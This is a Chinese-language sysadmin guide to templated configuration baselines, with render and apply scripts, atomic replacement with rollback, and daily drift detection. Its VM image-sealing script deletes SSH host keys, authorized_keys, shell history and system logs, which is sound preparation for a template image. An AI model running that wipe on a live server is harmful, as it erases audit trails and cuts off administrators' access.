> [!tip] ★★★ 為什麼要用 `/etc/.baseline-tmp/` 而不是直接放 `xxx.conf.new` 在目標目錄旁
> 因為有些目錄是「整個目錄都會被讀」的：
>
> | 目錄 | 會不會讀到你的暫存檔 |
> | --- | --- |
> | `/etc/ssh/sshd_config.d/` | 只讀 `*.conf` → `.new` 安全 |
> | `/etc/sysctl.d/` | 只讀 `*.conf` → `.new` 安全 |
> | `/etc/logrotate.d/` | ★★★ **整個目錄都讀**，但 `.new`、`.bak` 在預設 taboo 清單裡 → 安全 |
> | `/etc/apt/apt.conf.d/` | ★★★ `.bak` 被靜默忽略，**其他副檔名會發警告**，很吵 |
>
> 記這四條規則太累了。★★★★ 統一放 `/etc/.baseline-tmp/`（0700 root），
> 一條規則走天下，也不必每加一個範本就重新查一次那個目錄的讀取規則。

★★★ 備份也放目標目錄之外（`/var/backups/baseline/`），理由同上，而且**好清理**：

```bash
sudo mkdir -p /var/backups/baseline
sudo cp -a /etc/ssh/sshd_config.d/50-baseline.conf \
   /var/backups/baseline/50-baseline.conf.bak-$(date +%Y%m%d-%H%M)

```

預期輸出：


#### ★★★ reload 優先於 restart

| 服務 | 套用動作 | 為什麼 |
| --- | --- | --- |
| chrony | ★★★ `systemctl reload-or-restart chrony` | reload 保留既有時間校正狀態 |
| sshd（Ubuntu 24.04 socket 活化） | ★★★★ 改埠：`daemon-reload` + `restart ssh.socket`；其他項：新連線自動生效 | 不影響既有 session |
| sshd（RHEL / 非 socket 活化） | ★★★★★ `systemctl reload sshd`，**不要 restart** | restart 在設定錯誤時會讓服務起不來，等於鎖門 |
| sysctl | ★★★ `sysctl --system` | 重讀所有 `/etc/sysctl.d/` |
| journald | ★★ `systemctl restart systemd-journald` | journald 沒有 reload；socket 由 systemd 持有，中斷 <1 秒 |
| logrotate | ★ 不需要動作 | 下次 timer 觸發時自然讀新設定 |

#### ★★★★★ 封裝映像前必須清掉的東西

```bash
#!/usr/bin/env bash
# 在【要被封裝成範本的那台 VM 內】執行，執行完立刻關機，不要再開機
set -euo pipefail

# ★★★★★ ① 主機唯一識別碼 —— 沒清會造成 journald 與 DHCP 撞號
sudo truncate -s 0 /etc/machine-id
sudo rm -f /var/lib/dbus/machine-id
sudo ln -s /etc/machine-id /var/lib/dbus/machine-id

# ★★★★★ ② SSH 主機金鑰 —— 沒清 = 全機關共用同一把，中間人攻擊無感
sudo rm -f /etc/ssh/ssh_host_*
# （開機時 systemd 的 ssh-keygen 服務會自動重新產生）

# ★★★★ ③ 授權金鑰與帳號殘留
sudo rm -f /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys
sudo rm -f /root/.bash_history /home/*/.bash_history

# ★★★ ④ 網路狀態：DHCP lease、netplan 產生的固定設定
sudo rm -f /var/lib/dhcp/* /var/lib/NetworkManager/*.lease

# ★★★ ⑤ cloud-init 狀態（否則新機器認為自己已經初始化過了）
sudo cloud-init clean --logs --seed

# ★★★ ⑥ 日誌與快取
sudo journalctl --rotate && sudo journalctl --vacuum-time=1s
sudo rm -rf /var/log/*.log /var/log/journal/* /var/tmp/*
sudo apt clean

# ★★★ ⑦ 本篇的暫存與備份，不要帶進映像
sudo rm -rf /run/baseline-staging /etc/.baseline-tmp /var/backups/baseline/*

echo "清理完成 —— 立刻關機（sudo poweroff），不要再開機"
```

★★★★★ **`machine-id` 沒清的實際症狀**（很難聯想到根因）：

```text
四台機器有相同的 machine-id
  → journald 的 persistent 目錄以 machine-id 命名，遠端集中時四台的日誌混在一起
  → DHCP 用 machine-id 產生 client identifier，四台互相搶同一個租約
  → 症狀是「機器隨機掉線、IP 互相變來變去」，而你會去查交換器、查網路卡。
```

★★★★★ **`ssh_host_*` 沒清的實際症狀**：全機關 40 台的 SSH 指紋一模一樣。
使用者在 A 機器建立的 known_hosts 連 B 機器也不會警告 ——
**中間人把流量導去假伺服器時，客戶端同樣不會警告**。這是實質的資安缺失。

#### ★★★ 映像版本命名與退場

| 規則 | 範例 | 理由 |
| --- | --- | --- |
| ★★★ 名稱含 OS 與日期 | `ubuntu-2404-base-2026.08` | 一眼看出基底與新鮮度 |
| ★★★ 同時記錄內含的基準版本 | 描述欄寫 `baseline-2026.08` | 知道這映像出生時的基準 |
| ★★★★ 保留最近 **2** 個版本，其餘刪除 | 舊映像會被人「順手拿來用」 | 越舊的映像缺越多安全更新 |
| ★★★★ 映像超過 **6 個月**強制重做 | 累積的未套用更新太多 | 開機後第一次 `apt upgrade` 動輒數百個套件 |

★★★ 映像只負責把機器帶到「可以連進去」的狀態，
**其餘一律由本篇的範本與 [[020-02-03-05-svc-標準化-自動化佈建入門]] 的 playbook 補齊** ——
這樣映像才有機會保持輕薄。

```bash
#!/usr/bin/env bash
# baseline-render —— 依四層變數把範本 render 到暫存區並做語法檢查
# ★★★★ 本腳本【完全不碰 /etc】，任何時候都可以安全執行
# 退出碼：0 全部 render + 驗證成功 / 1 失敗
set -euo pipefail

REPO="${BASELINE_REPO:-/srv/baseline}"
STAGE="/run/baseline-staging"
MANIFEST="$REPO/templates.manifest"
HOST="$(hostname -s)"
ROLE=""; ENVN=""

die()  { echo "[FAIL] $*" >&2; exit 1; }
info() { echo "[ .. ] $*"; }
ok()   { echo "[ OK ] $*"; }

# ── 1. 從 hostname 解析角色與環境（角色-環境-序號）────────────────────
parse_host() {
  [[ "$HOST" =~ ^([a-z0-9]+)-([a-z]+)-([0-9]+)$ ]] \
    || die "主機名稱 '$HOST' 不符合 角色-環境-序號 規則（見 01-新機建置標準流程）"
  ROLE="${BASH_REMATCH[1]}"; ENVN="${BASH_REMATCH[2]}"
  ok "host=$HOST role=$ROLE env=$ENVN"
}

# ── 2. 依序載入四層變數 ──────────────────────────────────────────────
check_var_file() {
  local f="$1" owner perm
  owner="$(stat -c '%U' "$f")"; perm="$(stat -c '%a' "$f")"
  # ★★★★ .env 是被 source（＝執行）的，非 root 可寫就等於任意指令執行
  [[ "$owner" == "root" ]]            || die "$f 擁有者是 $owner，必須是 root"
  [[ "$perm" =~ ^[0-7][0-4][0-4]$ ]]  || die "$f 權限 $perm 可被群組或他人寫入"
}

load_vars() {
  local f
  local layers=( "$REPO/vars/global.env"
                 "$REPO/vars/role-${ROLE}.env"
                 "$REPO/vars/env-${ENVN}.env"
                 "$REPO/vars/host-${HOST}.env" )
  [[ -r "${layers[0]}" ]] || die "找不到全域變數檔 ${layers[0]}"
  set -a                                  # ★★★★ envsubst 讀環境變數，一定要 export
  for f in "${layers[@]}"; do
    [[ -f "$f" ]] || { info "略過（不存在）$f"; continue; }
    check_var_file "$f"
    # shellcheck disable=SC1090
    source "$f"
    ok "載入 $f"
  done
  set +a
}

# ── 3. 必填檢查（★★★★★ 擋掉「未定義 → 空字串」這個無聲坑）──────────
require_vars() {
  : "${BASELINE_VERSION:?未定義，請檢查 vars/global.env}"
  : "${BASELINE_CONTACT:?未定義，請檢查 vars/global.env}"
  : "${BASELINE_ORG_NAME:?未定義，請檢查 vars/global.env}"
  : "${BASELINE_TZ:?未定義}"
  : "${BASELINE_NTP1:?未定義}"
  : "${BASELINE_NTP2:?未定義}"
  : "${BASELINE_NTP_MAKESTEP:?未定義}"
  : "${BASELINE_SSH_PORT:?未定義}"
  : "${BASELINE_SSH_ALLOW_GROUPS:?未定義}"
  : "${BASELINE_SSH_MAX_AUTH:?未定義}"
  : "${BASELINE_SSH_LOGIN_GRACE:?未定義}"
  : "${BASELINE_JOURNAL_MAXUSE:?未定義}"
  : "${BASELINE_JOURNAL_RETENTION:?未定義}"
  : "${BASELINE_SOMAXCONN:?未定義}"
  : "${BASELINE_UFW_ALLOW:?未定義}"
  ok "必填變數齊全"
}

# ── 4. render（★★★★★ 白名單形式，前綴自動產生）─────────────────────
render_all() {
  local wl tpl target mode validator action out
  wl="$(compgen -v | grep '^BASELINE_' | sed 's/^/${/; s/$/}/' | tr '\n' ' ')"
  info "白名單變數 $(wc -w <<<"$wl") 個"

  rm -rf "$STAGE"; install -d -m 0700 -o root -g root "$STAGE"

  while IFS='|' read -r tpl target mode validator action; do
    [[ -z "$tpl" || "$tpl" == \#* ]] && continue
    [[ -f "$REPO/templates/$tpl" ]] || die "範本不存在：$REPO/templates/$tpl"
    out="$STAGE/$(basename "$target")"
    envsubst "$wl" < "$REPO/templates/$tpl" > "$out"
    chmod "$mode" "$out"

    # ★★★★ 產出檔自我檢查①：還有沒有沒被替換掉的 ${...}（打錯字或漏加前綴）
    if grep -q '\${' "$out"; then
      grep -n '\${' "$out" >&2
      die "$tpl：上列變數沒有被替換，檢查拼字與 BASELINE_ 前綴"
    fi
    # ★★★★★ 產出檔自我檢查②：有沒有「指令後面空著」的行（變數被 render 成空字串）
    if grep -nE '^[[:space:]]*[A-Za-z][A-Za-z0-9_]*[[:space:]]*$|=[[:space:]]*$' "$out"; then
      die "$tpl：上列指令沒有值，極可能是變數未定義被換成空字串"
    fi
    validate_one "$validator" "$out"
    ok "render + 驗證 $tpl → $target"
  done < "$MANIFEST"
}

# ── 5. 各類設定檔的語法檢查 ─────────────────────────────────────────
validate_one() {
  local kind="$1" f="$2"
  case "$kind" in
    sshd)     sshd -t -f "$f"            || die "sshd -t 失敗：$f" ;;
    chrony)   chronyd -p -f "$f" >/dev/null || die "chronyd -p 失敗：$f" ;;
    sysctl)   sysctl -p --dry-run "$f" >/dev/null || die "sysctl --dry-run 失敗：$f" ;;
    sudoers)  visudo -cf "$f" >/dev/null || die "visudo -c 失敗：$f" ;;
    logrotate) logrotate -d "$f" >/dev/null 2>&1 || die "logrotate -d 失敗：$f" ;;
    apt)      apt-config dump -c "$f" >/dev/null || die "apt-config 失敗：$f" ;;
    journald) # ★★★ journald 沒有原生檢查器，只能做基本格式 lint
              grep -q '^\[Journal\]' "$f" || die "journald 檔缺少 [Journal] 區段：$f"
              grep -vE '^\[|^#|^$|^[A-Za-z]+=' "$f" && die "journald 檔有非 key=value 行：$f"
              true ;;
    none)     : ;;
    *)        die "未知的驗證器 '$kind'（檢查 templates.manifest）" ;;
  esac
}

dump_vars() {                       # ★★★ 出事時第一個要看的東西：最終生效的值
  compgen -v | grep '^BASELINE_' | sort | while read -r v; do
    printf '%-32s = %s\n' "$v" "${!v}"
  done
}

main() {
  [[ $EUID -eq 0 ]] || die "請用 root 執行（sshd -t 與 chronyd -p 需要）"
  parse_host; load_vars; require_vars
  [[ "${1:-}" == "--dump-vars" ]] && { dump_vars; exit 0; }
  render_all
  ok "全部完成，產出在 $STAGE（尚未套用到 /etc）"
}
main "$@"
```

### 【5】`/usr/local/sbin/baseline-apply`

```bash
#!/usr/bin/env bash
# baseline-apply —— 比對 / 套用基準設定
#   --check   只比對並印出 diff（★★★★ 這就是漂移偵測；不碰 /etc）
#   --apply   備份 → 原子替換 → 套用動作 → 驗證 → 失敗自動回滾
#   --file X  只處理目標路徑含 X 的那一個檔
# 退出碼：0 一致（或套用成功）/ 2 偵測到漂移 / 1 錯誤
set -euo pipefail

REPO="${BASELINE_REPO:-/srv/baseline}"
STAGE="/run/baseline-staging"
TMPDIR_ETC="/etc/.baseline-tmp"          # ★★★★ 與 /etc 同一個檔案系統，mv 才是原子的
BACKUP="/var/backups/baseline"
MANIFEST="$REPO/templates.manifest"
STAMP="$(date +%Y%m%d-%H%M)"
MODE="check"; ONLY=""
DRIFT=0

die()  { echo "[FAIL] $*" >&2; exit 1; }
info() { echo "[ .. ] $*"; }
ok()   { echo "[ OK ] $*"; }
warn() { echo "[DRIFT] $*"; }

usage() { echo "用法：$0 [--check|--apply] [--file <路徑片段>]"; exit 1; }
while [[ $# -gt 0 ]]; do
  case "$1" in
    --check) MODE="check";;
    --apply) MODE="apply";;
    --file)  ONLY="${2:?--file 後面要接路徑片段}"; shift;;
    -h|--help) usage;;
    *) die "未知參數 $1";;
  esac; shift
done

[[ $EUID -eq 0 ]] || die "請用 root 執行"
[[ -d "$STAGE" ]] || die "找不到 $STAGE，請先執行 baseline-render"
install -d -m 0700 -o root -g root "$TMPDIR_ETC" "$BACKUP"

# ── 比對一個檔（內容 + 權限 + 擁有者）────────────────────────────────
compare_one() {
  local src="$1" target="$2" mode="$3" rc=0
  if [[ ! -e "$target" ]]; then
    warn "$target 不存在（尚未套用過基準）"; return 2
  fi
  if ! diff -u --label "repo:$target" --label "live:$target" "$src" "$target"; then
    rc=2
  fi
  # ★★★ diff 只看內容；權限與擁有者要另外比，否則 0777 的 sshd 設定檔會被漏掉
  local now_mode now_own
  now_mode="$(stat -c '%a' "$target")"; now_own="$(stat -c '%U:%G' "$target")"
  [[ "$now_mode" == "$mode" ]] || { warn "$target 權限 $now_mode ≠ 基準 $mode"; rc=2; }
  [[ "$now_own"  == "root:root" ]] || { warn "$target 擁有者 $now_own ≠ root:root"; rc=2; }
  return $rc
}

# ── ★★★★ 未納管檔案偵測：diff 法看不到「多出來的檔」──────────────────
check_orphans() {
  local d f base
  for d in /etc/ssh/sshd_config.d /etc/sysctl.d /etc/systemd/journald.conf.d; do
    [[ -d "$d" ]] || continue
    for f in "$d"/*.conf; do
      [[ -e "$f" ]] || continue
      base="$(basename "$f")"
      grep -q "|$d/$base|" "$MANIFEST" && continue
      case "$base" in
        50-cloud-init.conf|99-sysctl.conf|10-*.conf|60-*.conf) continue;;  # 系統自帶
      esac
      warn "未納管檔案 $f —— 可能是有人手動新增的（漂移）"
      DRIFT=1
    done
  done
}

# ── 套用一個檔 ──────────────────────────────────────────────────────
apply_one() {
  local src="$1" target="$2" mode="$3" action="$4" bak=""
  local newf="$TMPDIR_ETC/$(basename "$target").new"

  if [[ -e "$target" ]]; then                       # 1. 備份
    bak="$BACKUP/$(basename "$target").bak-$STAMP"
    cp -a "$target" "$bak"; info "備份 → $bak"
  fi
  install -o root -g root -m "$mode" "$src" "$newf" # 2. 放到同 fs 的暫存區
  mv -f "$newf" "$target"                           # 3. ★★★★ rename(2)，原子替換
  command -v restorecon >/dev/null && restorecon -F "$target" 2>/dev/null || true
  ok "已替換 $target"

  if ! do_action "$action"; then                    # 4. 套用 + 驗證，失敗回滾
    echo "[!!] 套用動作失敗，開始回滾" >&2
    if [[ -n "$bak" ]]; then
      cp -a "$bak" "$target"; do_action "$action" || true
      echo "[!!] 已回滾 $target ← $bak" >&2
    else
      rm -f "$target"; echo "[!!] 已移除新建的 $target" >&2
    fi
    return 1
  fi
  ok "套用動作完成：$action"
}

# ── 套用動作 + 服務健康驗證 ─────────────────────────────────────────
do_action() {
  local action="$1"
  case "$action" in
    none) return 0 ;;
    sysctl)
      sysctl --system >/dev/null || return 1
      [[ "$(sysctl -n net.core.somaxconn)" == "$BASELINE_SOMAXCONN" ]] || {
        echo "sysctl 值套用後不符：期望 $BASELINE_SOMAXCONN" >&2; return 1; }
      ;;
    reload:*)
      systemctl reload-or-restart "${action#reload:}" || return 1
      systemctl is-active --quiet "${action#reload:}" || return 1
      ;;
    restart:*)
      systemctl restart "${action#restart:}" || return 1
      systemctl is-active --quiet "${action#restart:}" || return 1
      ;;
    sshd)
      sshd -t || return 1                           # ★★★★ 替換後【再驗一次合併結果】
      if systemctl is-enabled --quiet ssh.socket 2>/dev/null; then
        systemctl daemon-reload                     # ★★★★★ Ubuntu 24.04：少這行埠不會變
        systemctl restart ssh.socket || return 1
      else
        systemctl reload ssh 2>/dev/null || systemctl reload sshd || return 1
      fi
      sleep 1
      # ★★★★★ 真的去敲一次埠，看得到 SSH banner 才算成功
      timeout 3 bash -c "exec 3<>/dev/tcp/127.0.0.1/${BASELINE_SSH_PORT}; head -1 <&3" \
        | grep -q '^SSH-2' || { echo "SSH 埠 ${BASELINE_SSH_PORT} 沒有回應" >&2; return 1; }
      ;;
    *) echo "未知動作 $action" >&2; return 1 ;;
  esac
  return 0
}

# ── 主流程 ─────────────────────────────────────────────────────────
set -a; source "$REPO/vars/global.env"
for f in "$REPO/vars/role-${HOSTNAME%%-*}.env" \
         "$REPO/vars/env-$(hostname -s | cut -d- -f2).env" \
         "$REPO/vars/host-$(hostname -s).env"; do
  [[ -f "$f" ]] && source "$f"
done
set +a

echo "=== baseline-apply ($MODE)  host=$(hostname -s)  版本=$BASELINE_VERSION  $(date '+%F %T %Z') ==="

while IFS='|' read -r tpl target mode validator action; do
  [[ -z "$tpl" || "$tpl" == \#* ]] && continue
  [[ -n "$ONLY" && "$target" != *"$ONLY"* ]] && continue
  src="$STAGE/$(basename "$target")"
  [[ -f "$src" ]] || die "$src 不存在，請先跑 baseline-render"

  if compare_one "$src" "$target" "$mode"; then
    ok "一致 $target"
  else
    DRIFT=1
    if [[ "$MODE" == "apply" ]]; then
      apply_one "$src" "$target" "$mode" "$action" || die "套用 $target 失敗（已回滾）"
    fi
  fi
done < "$MANIFEST"

check_orphans

# ★★★ 備份保留 90 天，避免 /var/backups 長胖
find "$BACKUP" -name '*.bak-*' -mtime +90 -delete 2>/dev/null || true

if [[ "$MODE" == "check" && $DRIFT -eq 1 ]]; then
  echo "=== 結果：偵測到漂移（退出碼 2）==="; exit 2
fi
echo "=== 結果：完成（退出碼 0）==="; exit 0
```

```text
     查值班紀錄 → 找到當事人 → 確認排查已結束、2222 不再需要。

【2】屬於哪一類處置？
     Port 是【SSH／防火牆／服務相關】→ ★★★★ 第二類「先告警等人工確認」。
     ★★★★★ 絕對不能讓 timer 自動回填 —— 若防火牆此刻只開 2222，
     自動改回 22 會【當場斷掉所有管理連線】。

【3】先在 tst 驗一次（就算你覺得沒必要）
       ssh web-tst-01 && sudo baseline-apply --apply --file sshd_config.d
     確認新連線能進來。

【4】確認 prd 的防火牆兩個埠都通，再單台套用
       ssh web-prd-02
       sudo ufw status | grep -E '22|2222'      # ★★★★ 先確認 22 是開的！
       sudo /usr/local/sbin/baseline-render
       sudo /usr/local/sbin/baseline-apply --apply --file sshd_config.d
       # ★★★★★ 保留這條 session，另開視窗驗證 22 埠可登入

【5】收尾
       sudo rm /etc/ssh/sshd_config.d/99-debug.conf     # 未納管檔案一併清掉
       sudo ufw delete allow 2222/tcp                   # 收回臨時規則
       在 docs/CHANGELOG.md 記一行：什麼時候、誰、為什麼、怎麼收斂
       補一張事後變更單（CHG-2026-08xx），註明「臨時修改未回填」
```

> [!tip] ★★★ 事故的真正修正不是那條 Port
> 是「排查時可以手改，但**必須在同一張變更單裡寫下回填期限**」這條規矩。
> 沒有這條規矩，你只會每個月抓到同一種漂移。
> ★★★ 更好的做法：排查用的設定一律放**另一個檔**（如 `99-debug.conf`）並設好日曆提醒，
> 這樣既不破壞基準檔，漂移報告的「未納管檔案」也會一直提醒你它還在。

### 【8】每天 06:00 的漂移偵測 timer

`/etc/systemd/system/baseline-drift.service`：

```ini
[Unit]
Description=Baseline drift detection (render + check)
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
# ★★★★ 只做 check，絕不 apply。自動修復要人按下去，不是排程按下去
ExecStart=/usr/bin/git -C /srv/baseline pull --ff-only
ExecStart=/usr/local/sbin/baseline-render
ExecStart=/bin/sh -c '/usr/local/sbin/baseline-apply --check >> /var/log/baseline-drift.log 2>&1; \
  rc=$?; [ $rc -eq 2 ] && logger -t baseline -p daemon.warning "漂移偵測：發現差異，見 /var/log/baseline-drift.log"; \
  exit 0'
SuccessExitStatus=0 2
```

`/etc/systemd/system/baseline-drift.timer`：

```ini
[Unit]
Description=Run baseline drift detection daily at 06:00

[Timer]
OnCalendar=*-*-* 06:00:00
RandomizedDelaySec=900        # ★★★★ 40 台同時 git pull 會打爆內部 Git 伺服器
Persistent=true               # ★★★ 開機補跑錯過的排程

[Install]
WantedBy=timers.target
```

啟用與驗證：

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now baseline-drift.timer
systemctl list-timers baseline-drift.timer
```

預期輸出：

```text
NEXT                        LEFT       LAST PASSED UNIT                  ACTIVATES
Sat 2026-08-29 06:07:12 CST 20h left   -    -      baseline-drift.timer  baseline-drift.service
```

★★★ 把 `logger` 那行寫進 syslog，[[100-01-03-guide-日誌-系統監控與告警]] 就能對 `baseline` 這個 tag 做告警規則，
不必再寫另一套通知機制。

## 常見錯誤與排錯

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| ★★★★★ 套用 sshd 範本後**新連線全部被拒**，舊 session 還活著 | `AllowGroups` 的群組名打錯或該群組不存在；或 `Port` 改了但防火牆沒開 | 用還活著的舊 session 立刻回滾（見〈回滾方式〉）。事前預防：`sshd -T \| grep allowgroups` 對照 `getent group <名稱>` |
| ★★★★★ nginx 範本 render 後 `$remote_addr` 全變空白，日誌格式壞掉 | 裸跑 `envsubst`，把所有合法變數名都吃掉 | 改用白名單形式 `envsubst "$WL" < tpl`；`WL` 由 `compgen -v \| grep '^BASELINE_'` 產生 |
| ★★★★★ 設定「看起來有設」但完全沒作用（如 `SystemMaxUse=`） | 變數未定義被 render 成空字串，語法合法語意全錯，且 `envsubst` 退出碼是 0 | render 前 `: "${VAR:?}"` 檢查必填；render 後 grep 空值行 |
| ★★★★ 每天的漂移報告**每台都有差異**，大家開始忽略它 | 範本檔頭放了 render 時間戳，或 repo 版本與各機不同步 | 檔頭只放 `BASELINE_VERSION`；timer 先 `git pull --ff-only` 再 render |
| ★★★★ 套用後 SSH 埠沒有變（Ubuntu 24.04） | socket 活化：埠由 systemd generator 從設定檔產生，`reload ssh` 不會重生成 | `systemctl daemon-reload && systemctl restart ssh.socket`，再 `ss -lntp` 確認 |
| ★★★★ 角色層設定套下去後**SSH 連不進來** | 清單型變數在角色層被「整個取代」，漏抄 `22/tcp` | 角色層一律整串重抄；套用前 `--dump-vars \| grep UFW` 目視確認 |
| ★★★★ 服務讀到半份設定檔、報奇怪的語法錯誤 | 從 `/run`（tmpfs）直接 `mv` 到 `/etc`＝跨 fs 複製，非原子 | 先 `install` 到 `/etc/.baseline-tmp/`，再 `mv`（同 fs 的 `rename(2)`） |
| ★★★★ 兩套工具打架：今天符合基準、明天又不符合 | 本篇範本與 TWGCB 派送（或 Ansible）同時管同一個檔，互相覆蓋 | 先劃**檔案歸屬表**，一個檔只能有一個擁有者；見〈安全性注意事項〉 |
| ★★★★ RHEL 上 drop-in 完全沒生效，也沒有錯誤訊息 | RHEL 8 的 `sshd_config` 可能沒有 `Include` 那行 | `head -5 /etc/ssh/sshd_config` 確認；沒有就自己加在**最前面** |
| ★★★★ RHEL 上 sshd 啟動失敗 `Permission denied` | SELinux context 錯誤（檔案從別處 mv 進 `/etc`） | `restorecon -Fv <檔>`；腳本裡已加自動處理 |
| ★★★ `sshd -t` 報 `Bad ownership or modes for directory` | 產出檔或目錄群組可寫 | `chmod 0600` 檔案、`0755` 目錄、`chown root:root` |
| ★★★ `.env` 裡的值有空白，套用後只吃到第一個字 | shell 變數展開時被 word splitting | 賦值時加引號 `BASELINE_X="1.0 3"`；範本裡該加引號的地方也要加 |
| ★★★ `/var/backups` 一直長大 | 每次套用都留備份，沒有保留期限 | 腳本已內建 `find ... -mtime +90 -delete`；確認 timer 有跑到 |
| ★★ 漂移報告漏抓「有人新增的檔」 | diff 只比對 manifest 裡列出的檔 | 用 `check_orphans` 掃描 drop-in 目錄裡未納管的 `*.conf` |

### 排查步驟

**【1】先確認產出對不對，而不是機器對不對**

```bash
sudo /usr/local/sbin/baseline-render && ls -l /run/baseline-staging/
```

預期輸出：

```text
[ OK ] 全部完成，產出在 /run/baseline-staging（尚未套用到 /etc）
-rw-r--r-- 1 root root 198 Aug 28 06:00 chrony.conf
-rw------- 1 root root 412 Aug 28 06:00 50-baseline.conf
```

- 這一步就失敗 → 問題在 **repo 或變數**，機器完全無辜，往【2】。
- 這一步成功 → 問題在**套用或服務**，跳到【4】。

**【2】看四層變數的最終值**

```bash
sudo /usr/local/sbin/baseline-render --dump-vars
```

預期輸出（節錄）：

```text
BASELINE_SOMAXCONN               = 4096
BASELINE_UFW_ALLOW               = 22/tcp 80/tcp 443/tcp
BASELINE_VERSION                 = baseline-2026.08
```

- 值不是你預期的 → 是**覆寫順序**問題，往【3】。
- 值是空的 → 變數根本沒定義，`grep -rn '變數名' /srv/baseline/vars/`。

**【3】確認是哪一層覆寫了它**

```bash
grep -n 'BASELINE_UFW_ALLOW' /srv/baseline/vars/*.env
```

預期輸出：

```text
/srv/baseline/vars/global.env:31:BASELINE_UFW_ALLOW="22/tcp"
/srv/baseline/vars/role-web.env:4:BASELINE_UFW_ALLOW="22/tcp 80/tcp 443/tcp"
```

★★★★ **最後一個被載入的層獲勝**（global → role → env → host）。
看到某一層漏抄了共通項（例如 role 層只寫 `80/tcp 443/tcp`），就是它。

**【4】確認產出檔本身沒有空值與殘留變數**

```bash
grep -nE '\$\{|^[[:space:]]*[A-Za-z][A-Za-z0-9_]*[[:space:]]*$|=[[:space:]]*$' \
  /run/baseline-staging/* || echo "clean"
```

預期輸出：

```text
clean
```

- 有輸出 `Port ` 這種行 → 是**坑②**（未定義變數變空字串），回【2】。
- 有輸出 `${BASELINE_XXX}` → 變數拼錯或沒加前綴，沒進白名單。

**【5】單獨驗證那個檔的語法**

```bash
sudo sshd -t -f /run/baseline-staging/50-baseline.conf; echo "rc=$?"
```

預期輸出：

```text
rc=0
```

- rc≠0 → 照訊息改範本。
- rc=0 但服務仍不正常 → ★★★★ 語法對、語意錯，往【6】。

**【6】看合併後【實際生效】的值（不是你以為的值）**

```bash
sudo sshd -T | grep -E '^(port|allowgroups|permitrootlogin)'
sudo systemd-analyze cat-config systemd/journald.conf | tail -8
sysctl -n net.core.somaxconn
```

預期輸出：

```text
port 22
permitrootlogin no
allowgroups opsadmin
...
MaxRetentionSec=180day
4096
```

- ★★★★ 生效值 ≠ 你的檔案內容 → **有另一個檔蓋過你**。
  `ls /etc/ssh/sshd_config.d/` 找數字更大（或 sysctl 排序更後面）的檔。
- ★★★★★ sshd 是**先取得者勝**（第一次出現的值有效），sysctl 是**後讀者勝**，
  兩個方向相反，排查時千萬別記反。

**【7】確認是不是別的工具在改同一個檔**

```bash
sudo journalctl -u baseline-drift.service --since '-3d' | grep DRIFT
sudo ls -l /etc/ssh/sshd_config.d/
sudo etckeeper vcs log --oneline -- /etc/ssh/sshd_config.d/ | head -10
```

預期輸出：

```text
[DRIFT] /etc/ssh/sshd_config.d/50-baseline.conf 內容不一致
a1b2c3d daily autocommit
9f8e7d6 committing changes in /etc after apt run     # ★★★★ 套件升級改過這個目錄
```

- 看到 `after apt run` → 是**套件升級改寫 conffile**，處理方式見下一節。
- 每天固定時間出現同樣的漂移 → 有另一個排程（TWGCB 派送、Ansible、廠商工具）在改。

**【8】套件升級改寫 conffile 的情況**

```bash
sudo find /etc -name '*.dpkg-dist' -o -name '*.dpkg-new' -o -name '*.ucf-dist' | head
```

預期輸出：

```text
/etc/ssh/sshd_config.dpkg-dist
```

★★★★ 有這種檔代表 **dpkg 保留了你的版本、把新版放旁邊**（或反過來）。
處理：`diff` 兩者 → 把新版帶來的**新選項**補進 repo 範本 → 重新 render 套用 →
刪掉 `.dpkg-dist`。★★★ 不要直接 `mv` 覆蓋，那等於繞過 repo。

## 安全性注意事項

> [!danger] ★★★★★ 絕對不要把私鑰、密碼、主機金鑰放進 baseline repo
> 一旦 commit，**git 歷史會永久保留**，即使你下一個 commit 就刪掉。
> repo 會被 clone 到管理機、開發筆電、備份磁帶、CI runner——
> 你無法回收任何一份副本。
>
> - `/etc/ssh/ssh_host_*`：進 repo = **全機關共用同一把主機金鑰**，
>   攻擊者可以偽裝成任何一台伺服器，客戶端**不會看到金鑰變更警告**。
> - `/etc/shadow`：密碼雜湊可離線暴力破解，稽核直接開重大缺失。
> - 資料庫連線字串、API token：等同把後端資料庫交出去。
>
> ★★★★ 需要派送機密時：用 `ansible-vault`（[[020-02-03-05-svc-標準化-自動化佈建入門]]）或機關的密碼保管系統，
> **不要用 base64 假裝加密**——那只是換個編碼。

> [!danger] ★★★★★ 漂移「自動修復」不可以全域開啟
> 想像 06:00 的 timer 帶著 `--apply` 跑遍 40 台，而昨天有人把範本裡的
> `AllowGroups` 打錯一個字：
>
> ```text
> 06:00:00  40 台同時套用 → 40 台同時拒絕所有 SSH 登入
> 06:00:03  監控告警爆掉，而你【連不進去任何一台】
> 06:30     全機關維運人員一起去機房插 KVM
> ```
>
> ★★★★ 正確節奏：**排程只跑 `--check` 出報告，人看過再 `--apply --file X` 單台套用。**
> 真的要自動回填，只限「第一類：安全基準且不影響連線」的項目（sysctl、issue.net），
> 而且仍要分批。

> [!danger] ★★★★ 兩套工具改同一個檔＝隱形災難
> 機關最常見的組合：本篇的範本 + [[090-06-06-guide-TWGCB-Linux大量派送]] 的組態派送 +
> 廠商的資安工具，三者都在改 `sshd_config`。症狀是「今天符合基準、明天又不符合」，
> 而且每一方都覺得自己是對的。
>
> ★★★★★ **唯一解法是先劃檔案歸屬表，一個檔只能有一個擁有者：**
>
> | 檔案 | 擁有者 | 其他工具只能 |
> | --- | --- | --- |
> | `/etc/ssh/sshd_config.d/50-baseline.conf` | 本篇 baseline repo | 讀取、告警 |
> | `/etc/ssh/sshd_config.d/60-twgcb.conf` | TWGCB 派送 | 讀取、告警 |
> | `/etc/sysctl.d/99-baseline.conf` | 本篇 baseline repo | 讀取、告警 |
>
> ★★★ 用**不同的 drop-in 檔名**分開，比爭論「誰該讓誰」有效一百倍。
> 數字前綴決定優先序，要在文件裡寫清楚誰壓誰。

> [!warning] ★★★ 稽核軌跡與最小權限
> - ★★★★ `/srv/baseline` 設 `0750 root:root`。裡面是**完整的安全組態藍圖** ——
>   攻擊者讀到它，就知道你開了哪些埠、加固了哪些項、哪台有例外。
> - ★★★★ 每一次基準變更都要在 git 留下 **who / when / why**，
>   這就是稽核要的軌跡；口頭交代的變更在稽核上等於沒發生。
> - ★★★ 單機例外表（`docs/exceptions.md`）要能一眼看出「全機關現在有幾個例外、幾個過期」。
